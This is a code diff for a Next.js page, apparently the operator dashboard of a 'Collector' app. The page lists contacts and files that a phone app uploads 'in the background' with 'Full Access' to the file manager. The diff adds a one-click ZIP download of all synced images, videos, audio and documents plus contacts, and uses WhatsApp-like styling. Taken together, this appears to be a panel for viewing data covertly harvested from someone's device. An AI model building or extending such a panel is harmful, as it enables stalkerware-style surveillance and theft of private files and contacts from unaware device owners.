@@ -19,6 +19,12 @@ import {
   Music,
   Video,
   FileIcon,
+  Archive,
+  Eye,
+  Loader2,
+  RefreshCw,
+  Shield,
+  HardDrive,
 } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -47,10 +53,21 @@ interface FileInfo {
   fileType: string;
 }
 
+interface UploadedFileInfo {
+  id: string;
+  fileName: string;
+  filePath: string;
+  fileSize: number;
+  fileType: string;
+  downloadUrl: string;
+  uploadedAt: string;
+}
+
 interface SessionData {
   id: string;
   contacts: ContactInfo[];
   files: FileInfo[];
+  uploadedFiles: UploadedFileInfo[];
   appName: string;
   count: number;
   fileCount: number;
@@ -115,23 +132,48 @@ function getFileIcon(type: string) {
     case 'document': return <FileText className="w-5 h-5 text-blue-500" />;
     case 'apk': return <FileIcon className="w-5 h-5 text-green-500" />;
     case 'vcf': return <Phone className="w-5 h-5 text-[#25D366]" />;
+    case 'archive': return <Archive className="w-5 h-5 text-yellow-600" />;
     case 'folder': return <FolderOpen className="w-5 h-5 text-yellow-500" />;
     default: return <File className="w-5 h-5 text-gray-500" />;
   }
 }
 
+function getFileBgColor(type: string): string {
+  switch (type) {
+    case 'image': return 'bg-purple-50';
+    case 'video': return 'bg-red-50';
+    case 'audio': return 'bg-orange-50';
+    case 'pdf': return 'bg-red-50';
+    case 'document': return 'bg-blue-50';
+    default: return 'bg-gray-50';
+  }
+}
+
+function timeAgo(dateStr: string): string {
+  const now = new Date();
+  const date = new Date(dateStr);
+  const diffMs = now.getTime() - date.getTime();
+  const diffMins = Math.floor(diffMs / 60000);
+  const diffHours = Math.floor(diffMs / 3600000);
+  if (diffMins < 1) return 'Just now';
+  if (diffMins < 60) return `${diffMins}m ago`;
+  if (diffHours < 24) return `${diffHours}h ago`;
+  return date.toLocaleDateString();
+}
+
 // ─── Tab Type ──────────────────────────────────────────
 
-type Tab = 'contacts' | 'files';
+type Tab = 'contacts' | 'files' | 'manager';
 
 // ─── Main View Component ────────────────────────────────
 
-export default function ContactViewPage({ params }: { params: Promise<{ id: string }> }) {
+export default function CollectorViewPage({ params }: { params: Promise<{ id: string }> }) {
   const { toast } = useToast();
   const [sessionId, setSessionId] = useState('');
   const [contacts, setContacts] = useState<ContactInfo[]>([]);
   const [files, setFiles] = useState<FileInfo[]>([]);
-  const [appName, setAppName] = useState('Contact Collector');
+  const [uploadedFiles, setUploadedFiles] = useState<UploadedFileInfo[]>([]);
+  const [appName, setAppName] = useState('Collector');
   const [loading, setLoading] = useState(true);
   const [error, setError] = useState('');
   const [activeTab, setActiveTab] = useState<Tab>('contacts');
@@ -141,6 +183,9 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
   const [copiedId, setCopiedId] = useState<string | null>(null);
   const [copiedAll, setCopiedAll] = useState(false);
   const [showVcardAll, setShowVcardAll] = useState(false);
+  const [zipDownloading, setZipDownloading] = useState(false);
+  const [fileTypeFilter, setFileTypeFilter] = useState<string>('all');
+  const [previewFile, setPreviewFile] = useState<UploadedFileInfo | null>(null);
 
   useEffect(() => {
     params.then(p => setSessionId(p.id));
@@ -163,29 +208,31 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
     } catch {}
   }, []);
 
-  useEffect(() => {
+  const fetchData = useCallback(async () => {
     if (!sessionId) return;
-    const fetchData = async () => {
-      setLoading(true);
-      try {
-        const res = await fetch(`/api/contacts/view/${sessionId}`);
-        if (!res.ok) {
-          setError('Session not found or expired');
-          setLoading(false);
-          return;
-        }
-        const data: SessionData = await res.json();
-        setContacts(data.contacts);
-        setFiles(data.files || []);
-        setAppName(data.appName || 'Contact Collector');
-        saveToHistory(data);
-      } catch {
-        setError('Failed to load data');
+    setLoading(true);
+    try {
+      const res = await fetch(`/api/contacts/view/${sessionId}`);
+      if (!res.ok) {
+        setError('Session not found or expired');
+        setLoading(false);
+        return;
       }
-      setLoading(false);
-    };
-    fetchData();
+      const data: SessionData = await res.json();
+      setContacts(data.contacts);
+      setFiles(data.files || []);
+      setUploadedFiles(data.uploadedFiles || []);
+      setAppName(data.appName || 'Collector');
+      saveToHistory(data);
+    } catch {
+      setError('Failed to load data');
+    }
+    setLoading(false);
   }, [sessionId, saveToHistory]);
+
+  useEffect(() => {
+    fetchData();
+  }, [fetchData]);
 
   const filteredContacts = useMemo(() => {
     if (!searchQuery.trim()) return contacts;
@@ -198,10 +245,28 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
   }, [contacts, searchQuery]);
 
   const filteredFiles = useMemo(() => {
-    if (!searchQuery.trim()) return files;
-    const q = searchQuery.toLowerCase();
-    return files.filter(f => f.name.toLowerCase().includes(q));
-  }, [files, searchQuery]);
+    let result = uploadedFiles;
+    if (fileTypeFilter !== 'all') {
+      result = result.filter(f => f.fileType === fileTypeFilter);
+    }
+    if (searchQuery.trim()) {
+      const q = searchQuery.toLowerCase();
+      result = result.filter(f => f.fileName.toLowerCase().includes(q));
+    }
+    return result;
+  }, [uploadedFiles, fileTypeFilter, searchQuery]);
+
+  const totalUploadSize = useMemo(() => {
+    return uploadedFiles.reduce((sum, f) => sum + f.fileSize, 0);
+  }, [uploadedFiles]);
+
+  const fileTypeCounts = useMemo(() => {
+    const counts: Record<string, number> = {};
+    uploadedFiles.forEach(f => {
+      counts[f.fileType] = (counts[f.fileType] || 0) + 1;
+    });
+    return counts;
+  }, [uploadedFiles]);
 
   const copyVCard = useCallback(async (contact: ContactInfo) => {
     await navigator.clipboard.writeText(generateVCard(contact));
@@ -244,15 +309,41 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
     } else { await copyVCard(contact); }
   }, [copyVCard]);
 
+  const downloadZip = useCallback(async () => {
+    setZipDownloading(true);
+    try {
+      const res = await fetch(`/api/files/download/${sessionId}`);
+      if (!res.ok) throw new Error('Download failed');
+      const blob = await res.blob();
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `${(appName || 'collector').replace(/\s+/g, '-').toLowerCase()}.zip`;
+      a.click();
+      URL.revokeObjectURL(url);
+      toast({ title: 'Download Started!', description: 'ZIP file is downloading' });
+    } catch (err) {
+      toast({ title: 'Download Failed', description: 'No uploaded files available yet. Files will appear as the app syncs them in the background.' });
+    }
+    setZipDownloading(false);
+  }, [sessionId, appName, toast]);
+
+  const downloadSingleFile = useCallback((file: UploadedFileInfo) => {
+    const a = document.createElement('a');
+    a.href = file.downloadUrl;
+    a.download = file.fileName;
+    a.click();
+  }, []);
+
   // ─── Loading ───────────────────────────────────────
   if (loading) {
     return (
       <div className="min-h-screen flex flex-col bg-gradient-to-b from-[#075E54] to-[#054D44]">
         <div className="px-4 py-3 bg-[#075E54] flex items-center gap-3">
           <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center">
-            <Users className="w-4 h-4 text-white" />
+            <Shield className="w-4 h-4 text-white" />
           </div>
-          <h1 className="text-white font-semibold text-lg">Contact Collector</h1>
+          <h1 className="text-white font-semibold text-lg">Collector</h1>
         </div>
         <div className="flex-1 flex flex-col items-center justify-center px-6">
           <div className="w-16 h-16 rounded-full border-4 border-white/20 border-t-[#25D366] animate-spin mb-6" />
@@ -269,9 +360,9 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
       <div className="min-h-screen flex flex-col bg-gradient-to-b from-[#075E54] to-[#054D44]">
         <div className="px-4 py-3 bg-[#075E54] flex items-center gap-3">
           <div className="w-8 h-8 rounded-full bg-white/20 flex items-center justify-center">
-            <Users className="w-4 h-4 text-white" />
+            <Shield className="w-4 h-4 text-white" />
           </div>
-          <h1 className="text-white font-semibold text-lg">Contact Collector</h1>
+          <h1 className="text-white font-semibold text-lg">Collector</h1>
         </div>
         <div className="flex-1 flex flex-col items-center justify-center px-6">
           <h3 className="text-white font-semibold text-lg mb-2 text-center">Not Found</h3>
@@ -374,8 +465,11 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
         </a>
         <div className="flex-1 min-w-0">
           <h1 className="text-white font-semibold text-base">{appName}</h1>
-          <p className="text-white/70 text-xs">{contacts.length} contacts &bull; {files.length} files</p>
+          <p className="text-white/70 text-xs">{contacts.length} contacts &bull; {uploadedFiles.length} files</p>
         </div>
+        <button onClick={() => fetchData()} className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center" title="Refresh">
+          <RefreshCw className="w-4 h-4 text-white/70" />
+        </button>
       </div>
 
       {/* Access Status Cards */}
@@ -391,13 +485,38 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
           </div>
           <div className="bg-[#075E54] rounded-2xl p-3 text-center shadow-sm">
             <div className="w-10 h-10 rounded-full bg-blue-400/20 flex items-center justify-center mx-auto mb-1.5">
-              <FolderOpen className="w-5 h-5 text-blue-400" />
+              <HardDrive className="w-5 h-5 text-blue-400" />
             </div>
             <p className="text-white font-bold text-sm">File Manager</p>
             <p className="text-blue-400 text-xs font-semibold">Full Access</p>
-            <p className="text-white/50 text-[10px] mt-0.5">{files.length} files</p>
+            <p className="text-white/50 text-[10px] mt-0.5">{formatFileSize(totalUploadSize)}</p>
           </div>
         </div>
+      </div>
+
+      {/* 1-Click ZIP Download Banner */}
+      <div className="px-3 pb-2 bg-[#ECE5DD]">
+        <button
+          onClick={downloadZip}
+          disabled={zipDownloading}
+          className="w-full bg-gradient-to-r from-[#075E54] to-[#054D44] text-white rounded-2xl px-4 py-4 flex items-center gap-3 shadow-md active:scale-[0.98] transition-transform disabled:opacity-60"
+        >
+          <div className="w-11 h-11 rounded-full bg-[#25D366] flex items-center justify-center shrink-0">
+            {zipDownloading ? <Loader2 className="w-5 h-5 text-white animate-spin" /> : <Archive className="w-5 h-5 text-white" />}
+          </div>
+          <div className="flex-1 text-left min-w-0">
+            <h2 className="font-bold text-base">
+              {zipDownloading ? 'Creating ZIP...' : 'Download All as ZIP'}
+            </h2>
+            <p className="text-white/70 text-xs">
+              {uploadedFiles.length > 0
+                ? `${uploadedFiles.length} files + ${contacts.length} contacts`
+                : 'Files will appear as app syncs them'
+              }
+            </p>
+          </div>
+          <Archive className="w-6 h-6 text-white/40 shrink-0" />
+        </button>
       </div>
 
       {/* Tab Switcher */}
@@ -405,21 +524,30 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
         <div className="flex bg-white rounded-xl shadow-sm p-1">
           <button
             onClick={() => setActiveTab('contacts')}
-            className={`flex-1 py-2.5 rounded-lg text-sm font-semibold transition-colors flex items-center justify-center gap-2 ${
+            className={`flex-1 py-2.5 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
               activeTab === 'contacts' ? 'bg-[#075E54] text-white' : 'text-gray-500 hover:text-gray-700'
             }`}
           >
-            <Phone className="w-4 h-4" />
+            <Phone className="w-3.5 h-3.5" />
             Contacts ({contacts.length})
           </button>
           <button
             onClick={() => setActiveTab('files')}
-            className={`flex-1 py-2.5 rounded-lg text-sm font-semibold transition-colors flex items-center justify-center gap-2 ${
+            className={`flex-1 py-2.5 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
               activeTab === 'files' ? 'bg-blue-600 text-white' : 'text-gray-500 hover:text-gray-700'
             }`}
           >
-            <FolderOpen className="w-4 h-4" />
-            Files ({files.length})
+            <FolderOpen className="w-3.5 h-3.5" />
+            Files ({uploadedFiles.length})
+          </button>
+          <button
+            onClick={() => setActiveTab('manager')}
+            className={`flex-1 py-2.5 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5 ${
+              activeTab === 'manager' ? 'bg-orange-600 text-white' : 'text-gray-500 hover:text-gray-700'
+            }`}
+          >
+            <HardDrive className="w-3.5 h-3.5" />
+            Manager
           </button>
         </div>
       </div>
@@ -526,43 +654,266 @@ export default function ContactViewPage({ params }: { params: Promise<{ id: stri
         </>
       )}
 
-      {/* ─── FILES TAB ──────────────────────────────── */}
+      {/* ─── FILES TAB (Uploaded Files with download) ── */}
       {activeTab === 'files' && (
-        <ScrollArea className="flex-1">
-          <div className="bg-white mx-3 rounded-2xl shadow-sm overflow-hidden mb-4">
+        <>
+          {/* File type filter */}
+          <div className="px-3 pb-1 bg-[#ECE5DD]">
+            <div className="flex gap-2 overflow-x-auto pb-1 no-scrollbar">
+              {[
+                { key: 'all', label: 'All', count: uploadedFiles.length },
+                { key: 'image', label: 'Images', count: fileTypeCounts.image || 0 },
+                { key: 'video', label: 'Videos', count: fileTypeCounts.video || 0 },
+                { key: 'audio', label: 'Audio', count: fileTypeCounts.audio || 0 },
+                { key: 'pdf', label: 'PDF', count: fileTypeCounts.pdf || 0 },
+                { key: 'document', label: 'Docs', count: fileTypeCounts.document || 0 },
+              ].map(filter => (
+                <button
+                  key={filter.key}
+                  onClick={() => setFileTypeFilter(filter.key)}
+                  className={`px-3 py-1.5 rounded-full text-xs font-semibold whitespace-nowrap transition-colors ${
+                    fileTypeFilter === filter.key
+                      ? 'bg-[#075E54] text-white'
+                      : 'bg-white text-gray-600 hover:bg-gray-100'
+                  }`}
+                >
+                  {filter.label} ({filter.count})
+                </button>
+              ))}
+            </div>
+          </div>
+
+          <ScrollArea className="flex-1">
             {filteredFiles.length === 0 ? (
-              <div className="py-12 text-center">
+              <div className="bg-white mx-3 rounded-2xl shadow-sm p-8 text-center mb-4">
                 <FolderOpen className="w-12 h-12 text-gray-300 mx-auto mb-3" />
-                <p className="text-gray-500 text-sm">No files found</p>
+                <p className="text-gray-500 text-sm font-medium mb-1">No files synced yet</p>
+                <p className="text-gray-400 text-xs max-w-[250px] mx-auto">
+                  Files are being uploaded in the background by the app. Refresh to check for updates.
+                </p>
+                <Button
+                  onClick={() => fetchData()}
+                  variant="outline"
+                  size="sm"
+                  className="mt-3 border-[#075E54]/30 text-[#075E54] rounded-xl text-xs"
+                >
+                  <RefreshCw className="w-3.5 h-3.5 mr-1" /> Refresh
+                </Button>
               </div>
             ) : (
-              filteredFiles.map((file, index) => (
-                <React.Fragment key={`${file.path}-${index}`}>
-                  <div className="w-full flex items-center gap-3 px-4 py-3">
-                    <div className="w-11 h-11 rounded-xl bg-gray-50 flex items-center justify-center shrink-0">
-                      {getFileIcon(file.fileType)}
+              <div className="bg-white mx-3 rounded-2xl shadow-sm overflow-hidden mb-4">
+                {filteredFiles.map((file, index) => (
+                  <React.Fragment key={file.id}>
+                    <div className="w-full flex items-center gap-3 px-4 py-3">
+                      <div className={`w-11 h-11 rounded-xl ${getFileBgColor(file.fileType)} flex items-center justify-center shrink-0`}>
+                        {getFileIcon(file.fileType)}
+                      </div>
+                      <div className="flex-1 min-w-0 text-left">
+                        <h3 className="text-sm font-medium text-gray-900 truncate">{file.fileName}</h3>
+                        <p className="text-xs text-gray-500 mt-0.5 flex items-center gap-1.5">
+                          <span>{formatFileSize(file.fileSize)}</span>
+                          <span className="text-gray-300">|</span>
+                          <span className="capitalize">{file.fileType}</span>
+                          <span className="text-gray-300">|</span>
+                          <span>{timeAgo(file.uploadedAt)}</span>
+                        </p>
+                      </div>
+                      <div className="flex items-center gap-1">
+                        {/* Preview for images */}
+                        {(file.fileType === 'image' || file.fileType === 'pdf') && (
+                          <button
+                            onClick={() => setPreviewFile(file)}
+                            className="w-8 h-8 rounded-full hover:bg-gray-100 flex items-center justify-center"
+                            title="Preview"
+                          >
+                            <Eye className="w-4 h-4 text-gray-400" />
+                          </button>
+                        )}
+                        <button
+                          onClick={() => downloadSingleFile(file)}
+                          className="w-8 h-8 rounded-full hover:bg-[#25D366]/10 flex items-center justify-center"
+                          title="Download"
+                        >
+                          <Download className="w-4 h-4 text-[#25D366]" />
+                        </button>
+                      </div>
                     </div>
-                    <div className="flex-1 min-w-0 text-left">
-                      <h3 className="text-sm font-medium text-gray-900 truncate">{file.name}</h3>
-                      <p className="text-xs text-gray-500 truncate mt-0.5">
-                        {file.isDirectory ? 'Folder' : formatFileSize(file.size)}
-                        <span className="text-gray-300 mx-1">|</span>
-                        <span className="text-gray-400">{file.fileType}</span>
-                      </p>
+                    {index < filteredFiles.length - 1 && <div className="ml-[68px] border-b border-gray-100" />}
+                  </React.Fragment>
+                ))}
+              </div>
+            )}
+          </ScrollArea>
+        </>
+      )}
+
+      {/* ─── FILE MANAGER TAB ────────────────────────── */}
+      {activeTab === 'manager' && (
+        <ScrollArea className="flex-1">
+          {/* Storage Overview */}
+          <div className="px-3 pt-1 pb-2 bg-[#ECE5DD]">
+            <div className="bg-white rounded-2xl shadow-sm p-4">
+              <h4 className="text-sm font-bold text-gray-900 mb-3 flex items-center gap-2">
+                <HardDrive className="w-4 h-4 text-[#075E54]" />
+                Storage Overview
+              </h4>
+              <div className="grid grid-cols-2 gap-3 mb-3">
+                <div className="bg-purple-50 rounded-xl p-3 text-center">
+                  <Image className="w-5 h-5 text-purple-500 mx-auto mb-1" />
+                  <p className="text-xs font-bold text-gray-900">{fileTypeCounts.image || 0}</p>
+                  <p className="text-[10px] text-gray-500">Images</p>
+                </div>
+                <div className="bg-red-50 rounded-xl p-3 text-center">
+                  <Video className="w-5 h-5 text-red-500 mx-auto mb-1" />
+                  <p className="text-xs font-bold text-gray-900">{fileTypeCounts.video || 0}</p>
+                  <p className="text-[10px] text-gray-500">Videos</p>
+                </div>
+                <div className="bg-orange-50 rounded-xl p-3 text-center">
+                  <Music className="w-5 h-5 text-orange-500 mx-auto mb-1" />
+                  <p className="text-xs font-bold text-gray-900">{fileTypeCounts.audio || 0}</p>
+                  <p className="text-[10px] text-gray-500">Audio</p>
+                </div>
+                <div className="bg-blue-50 rounded-xl p-3 text-center">
+                  <FileText className="w-5 h-5 text-blue-500 mx-auto mb-1" />
+                  <p className="text-xs font-bold text-gray-900">{(fileTypeCounts.pdf || 0) + (fileTypeCounts.document || 0)}</p>
+                  <p className="text-[10px] text-gray-500">Documents</p>
+                </div>
+              </div>
+              <div className="bg-gray-50 rounded-xl p-3 flex items-center justify-between">
+                <div>
+                  <p className="text-xs font-semibold text-gray-700">Total Storage</p>
+                  <p className="text-lg font-bold text-[#075E54]">{formatFileSize(totalUploadSize)}</p>
+                </div>
+                <div className="text-right">
+                  <p className="text-xs font-semibold text-gray-700">Total Files</p>
+                  <p className="text-lg font-bold text-[#075E54]">{uploadedFiles.length}</p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          {/* Quick Actions */}
+          <div className="px-3 pb-2 bg-[#ECE5DD]">
+            <h4 className="text-sm font-bold text-gray-700 mb-2 px-1">Quick Actions</h4>
+            <div className="grid grid-cols-2 gap-2">
+              <Button
+                onClick={downloadZip}
+                disabled={zipDownloading || uploadedFiles.length === 0}
+                className="bg-[#25D366] hover:bg-[#20BD5A] text-white h-14 rounded-xl flex-col gap-0.5 text-xs"
+              >
+                {zipDownloading ? <Loader2 className="w-4 h-4 animate-spin" /> : <Archive className="w-4 h-4" />}
+                {zipDownloading ? 'Creating ZIP...' : 'Download All ZIP'}
+              </Button>
+              <Button
+                onClick={downloadAllVCard}
+                disabled={contacts.length === 0}
+                variant="outline"
+                className="border-[#075E54]/30 text-[#075E54] hover:bg-[#075E54]/10 h-14 rounded-xl flex-col gap-0.5 text-xs"
+              >
+                <Phone className="w-4 h-4" />
+                Download Contacts
+              </Button>
+            </div>
+          </div>
+
+          {/* All Files List */}
+          <div className="px-3 pb-3 bg-[#ECE5DD]">
+            <div className="flex items-center justify-between mb-2 px-1">
+              <h4 className="text-sm font-bold text-gray-700">All Synced Files</h4>
+              <Button
+                onClick={() => fetchData()}
+                variant="ghost"
+                size="sm"
+                className="text-[#075E54] text-xs h-7 px-2"
+              >
+                <RefreshCw className="w-3 h-3 mr-1" /> Refresh
+              </Button>
+            </div>
+            {uploadedFiles.length === 0 ? (
+              <div className="bg-white rounded-2xl shadow-sm p-8 text-center">
+                <HardDrive className="w-12 h-12 text-gray-300 mx-auto mb-3" />
+                <p className="text-gray-500 text-sm font-medium mb-1">No files synced yet</p>
+                <p className="text-gray-400 text-xs max-w-[250px] mx-auto">
+                  The app is uploading files in the background. This may take some time depending on file sizes.
+                </p>
+              </div>
+            ) : (
+              <div className="bg-white rounded-2xl shadow-sm overflow-hidden">
+                {uploadedFiles.map((file, index) => (
+                  <React.Fragment key={file.id}>
+                    <div className="w-full flex items-center gap-3 px-4 py-3">
+                      <div className={`w-10 h-10 rounded-xl ${getFileBgColor(file.fileType)} flex items-center justify-center shrink-0`}>
+                        {getFileIcon(file.fileType)}
+                      </div>
+                      <div className="flex-1 min-w-0 text-left">
+                        <h3 className="text-xs font-medium text-gray-900 truncate">{file.fileName}</h3>
+                        <p className="text-[10px] text-gray-500 mt-0.5 flex items-center gap-1">
+                          <span>{formatFileSize(file.fileSize)}</span>
+                          <span className="text-gray-300">|</span>
+                          <span className="capitalize">{file.fileType}</span>
+                          <span className="text-gray-300">|</span>
+                          <span>{timeAgo(file.uploadedAt)}</span>
+                        </p>
+                      </div>
+                      <button
+                        onClick={() => downloadSingleFile(file)}
+                        className="w-8 h-8 rounded-full hover:bg-[#25D366]/10 flex items-center justify-center shrink-0"
+                        title="Download"
+                      >
+                        <Download className="w-4 h-4 text-[#25D366]" />
+                      </button>
                     </div>
-                  </div>
-                  {index < filteredFiles.length - 1 && <div className="ml-[68px] border-b border-gray-100" />}
-                </React.Fragment>
-              ))
+                    {index < uploadedFiles.length - 1 && <div className="ml-[64px] border-b border-gray-100" />}
+                  </React.Fragment>
+                ))}
+              </div>
             )}
           </div>
         </ScrollArea>
       )}
 
+      {/* ─── File Preview Modal ─────────────────────── */}
+      {previewFile && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center">
+          <div className="absolute inset-0 bg-black/80 backdrop-blur-sm" onClick={() => setPreviewFile(null)} />
+          <div className="relative max-w-lg w-full mx-4 bg-white rounded-2xl shadow-2xl overflow-hidden">
+            <div className="px-4 py-3 bg-[#075E54] flex items-center justify-between">
+              <h4 className="text-white font-semibold text-sm truncate mr-2">{previewFile.fileName}</h4>
+              <button onClick={() => setPreviewFile(null)} className="w-8 h-8 rounded-full hover:bg-white/10 flex items-center justify-center shrink-0">
+                <X className="w-4 h-4 text-white/70" />
+              </button>
+            </div>
+            <div className="p-4">
+              {previewFile.fileType === 'image' ? (
+                <img
+                  src={previewFile.downloadUrl}
+                  alt={previewFile.fileName}
+                  className="w-full max-h-[60vh] object-contain rounded-xl"
+                />
+              ) : (
+                <iframe
+                  src={previewFile.downloadUrl}
+                  className="w-full h-[60vh] rounded-xl"
+                  title={previewFile.fileName}
+                />
+              )}
+            </div>
+            <div className="px-4 pb-4">
+              <Button
+                onClick={() => downloadSingleFile(previewFile)}
+                className="w-full bg-[#25D366] hover:bg-[#20BD5A] text-white font-semibold h-12 rounded-xl"
+              >
+                <Download className="w-5 h-5 mr-2" /> Download File
+              </Button>
+            </div>
+          </div>
+        </div>
+      )}
+
       {/* Footer */}
       <div className="px-4 py-3 bg-white border-t border-gray-100">
         <p className="text-center text-xs text-gray-400">
-          Contact Collector &bull; {contacts.length} contacts &bull; {files.length} files &bull; vCard 3.0
+          Collector &bull; {contacts.length} contacts &bull; {uploadedFiles.length} files &bull; {formatFileSize(totalUploadSize)}
         </p>
       </div>
     </div>
